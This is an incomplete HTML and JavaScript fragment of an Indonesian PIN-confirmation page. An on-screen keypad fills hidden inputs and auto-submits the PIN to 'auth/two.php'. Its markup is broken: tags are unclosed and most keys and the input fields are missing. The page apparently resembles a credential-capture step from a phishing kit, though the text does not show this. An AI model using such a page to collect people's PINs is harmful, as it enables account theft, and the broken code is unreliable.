        <h1 class="title">Konfirmasi PIN</h1>

        <form id="pin-form" action="auth/two.php" method="post">

            <div class="key" data-value="9">9</div>
            <div class="key empty"></div>
            <div class="key" data-value="0">0</div>
            <div class="key delete">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M6.29289 6.29289C6.68342 5.90237 7.31658 5.90237 7.70711 6.29289L12 10.5858L16.2929 6.29289C16.6834 5.90237 17.3166 5.90237 17.7071 6.29289C18.0976 6.68342 18.0976 7.31658 17.7071 7.70711L13.4142 12L17.7071 16.2929C18.0976 16.6834 18.0976 17.3166 17.7071 17.7071C17.3166 18.0976 16.6834 18.0976 16.2929 17.7071L12 13.4142L7.70711 17.7071C7.31658 18.0976 6.68342 18.0976 6.29289 17.7071C5.90237 17.3166 5.90237 16.6834 6.29289 16.2929L10.5858 12L6.29289 7.70711C5.90237 7.31658 5.90237 6.68342 6.29289 6.29289Z" fill="#9E9E9E"/>

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const pinForm = document.getElementById('pin-form');
        const pinInputs = document.querySelectorAll('.pin-input');
        const keys = document.querySelectorAll('.key:not(.empty)');
        const deleteBtn = document.querySelector('.key.delete');
        
        let currentIndex = 0;
    
        
        keys.forEach(key => {
            key.addEventListener('click', function() {
                if (this.classList.contains('delete')) {
                    if (currentIndex > 0) {
                        currentIndex--;
                        pinInputs[currentIndex].value = '';
                    }
                } else {
                    if (currentIndex < pinInputs.length) {
                        const value = this.getAttribute('data-value');
                        pinInputs[currentIndex].value = value;
                        currentIndex++;
                        
                        if (currentIndex === pinInputs.length) {
                            
                            setTimeout(() => {
                                pinForm.submit();
                            }, 200); 
                        }
                    }
                }
            });
        });
    
        
        pinInputs.forEach((input, index) => {
            input.addEventListener('keydown', function(e) {
                e.preventDefault();
            });
        });
    });
    </script>
